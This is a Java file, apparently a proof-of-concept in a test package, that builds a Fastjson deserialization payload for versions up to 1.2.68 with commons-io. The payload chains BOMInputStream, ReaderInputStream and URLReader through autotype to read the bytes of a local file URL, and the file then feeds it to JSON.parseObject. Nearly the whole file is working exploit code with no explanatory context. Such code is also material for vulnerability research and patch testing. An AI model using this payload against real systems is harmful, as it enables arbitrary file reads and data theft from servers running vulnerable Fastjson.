package test;

import java.io.InputStream;
import java.net.URL;
import java.util.Arrays;
import com.alibaba.fastjson.JSON;

public class Fastjson09_io_read {
    public static void main(String[] args) throws Exception {
    	//<=1.2.68 and commons-io
    	String url = "file:///D:/";
    	InputStream input = new URL(url).openStream();
        byte[] bs = new byte[input.available()];
        input.read(bs);
        System.out.println(Arrays.toString(bs));
        System.out.println(new String(bs));
    	String payload = "{\r\n"
    			+ "    \"abc\": {\r\n"
    			+ "        \"@type\": \"java.lang.AutoCloseable\",\r\n"
    			+ "        \"@type\": \"org.apache.commons.io.input.BOMInputStream\",\r\n"
    			+ "        \"delegate\": {\r\n"
    			+ "            \"@type\": \"org.apache.commons.io.input.ReaderInputStream\",\r\n"
    			+ "            \"reader\": {\r\n"
    			+ "                \"@type\": \"jdk.nashorn.api.scripting.URLReader\",\r\n"
    			+ "                \"url\": \""+url+"\"\r\n"
    			+ "            },\r\n"
    			+ "            \"charsetName\": \"UTF-8\",\r\n"
    			+ "            \"bufferSize\": 1024\r\n"
    			+ "        },\r\n"
    			+ "        \"boms\": [{\r\n"
    			+ "            \"charsetName\": \"UTF-8\",\r\n"
    			+ "            \"bytes\": [36]\r\n"
    			+ "        },{\r\n"
    			+ "            \"charsetName\": \"UTF-8\",\r\n"
    			+ "            \"bytes\": [49]\r\n"
    			+ "        }]\r\n"
    			+ "    },\r\n"
    			+ "    \"address\": {\r\n"
    			+ "        \"$ref\": \"$.abc.BOM\"\r\n"
    			+ "    }\r\n"
    			+ "}";
    	System.out.println(payload);
    	System.out.println(JSON.parseObject(payload));
    }
}
